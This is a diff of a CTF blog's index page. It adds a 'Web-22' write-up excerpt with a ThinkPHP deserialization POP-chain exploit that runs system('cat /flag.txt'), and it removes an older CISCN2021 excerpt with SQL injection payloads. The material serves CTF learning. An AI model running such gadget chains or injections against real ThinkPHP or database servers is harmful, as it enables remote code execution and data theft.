@@ -161,7 +161,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">44</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">45</span></a>
 
   </li>
   </ul>
@@ -186,6 +186,87 @@
             
 
   <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2022/05/30/Web-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/30/Web-22/" class="post-title-link" itemprop="url">Web-22</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-30 16:26:29 / Modified: 16:29:20" itemprop="dateCreated datePublished" datetime="2022-05-30T16:26:29+08:00">2022-05-30</time>
+            </span>
+
+          
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>26 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> $data = [];</span><br><span class="line">        <span class="keyword">private</span> $exists = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $table;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">        <span class="keyword">protected</span> $json = [];</span><br><span class="line">        <span class="keyword">protected</span> $jsonAssoc = <span class="keyword">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">'whoami'</span> =&gt; [<span class="string">'cat /flag.txt'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'whoami'</span> =&gt; [<span class="string">'system'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">'whoami'</span>,[<span class="string">'whoami'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="keyword">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/05/30/Web-22/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
         
   
   
@@ -950,93 +1031,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2021/05/20/Web_18/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Str3am.jpg">
-      <meta itemprop="name" content="Str3am">
-      <meta itemprop="description" content="这个人很懒，什么也没留下">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Str3am's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/20/Web_18/" class="post-title-link" itemprop="url">CISCN2021初赛 Web Writeup</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-05-20 14:54:55 / Modified: 14:59:25" itemprop="dateCreated datePublished" datetime="2021-05-20T14:54:55+08:00">2021-05-20</time>
-            </span>
-
-          
-  
-  
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-              <span>12k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-              <span>15 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>报错注入，盲猜flag表，但不知道名称，用重复column名爆列名</p>
-<p>参考：<a href="https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">无列名注入小记</a></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%27)<span class="comment">/**/</span>||<span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">where</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span> a<span class="comment">/**/</span><span class="keyword">join</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">using</span>(<span class="keyword">id</span>,<span class="keyword">no</span>))<span class="keyword">as</span><span class="comment">/**/</span>c))<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="string">'1&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png" alt="image-20210518133713042"></p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`,<span class="number">31</span>)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br><span class="line"></span><br><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br></pre></td></tr></table></figure>
-
-<p>读出flag CISCN{9fO5F-WC2YL-GY3zM-R4aIu-kAjxU-}</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/05/20/Web_18/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1109,7 +1103,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1178,7 +1172,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="Symbols count total">401k</span>
+    <span title="Symbols count total">421k</span>
 </div> 
 
 <script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
